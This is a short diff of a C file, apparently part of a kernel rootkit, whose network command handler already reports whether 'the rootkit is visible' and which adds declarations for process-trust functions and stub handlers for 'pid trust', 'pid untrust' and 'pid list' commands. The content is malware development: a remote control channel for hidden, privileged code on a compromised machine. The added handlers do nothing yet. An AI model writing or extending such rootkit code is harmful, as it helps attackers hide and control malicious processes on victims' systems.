@@ -28,7 +28,10 @@ struct server_t{
 struct client_t client;
 struct server_t server;
 extern bool module_hidden;
-
+extern int trust_pid(int);
+extern int untrust_pid(int);
+extern bool check_pid_trusted(int);
+extern int list_trusted_pids(void);
 
 static int run_server(void *port){
 	int err;
@@ -201,6 +204,15 @@ static int client_handler(void){
 				strcpy(client.message, "[server.c::client_handler] the rootkit is visible");
 				net_send();
 			}
+		}
+		else if (strncmp("pid trust", client.message, 9)==0){
+			continue;
+		}
+		else if (strncmp("pid untrust", client.message, 11)==0){
+			continue;
+		}
+		else if (strncmp("pid list", client.message, 8)==0){
+			continue;
 		}
 	}
 }
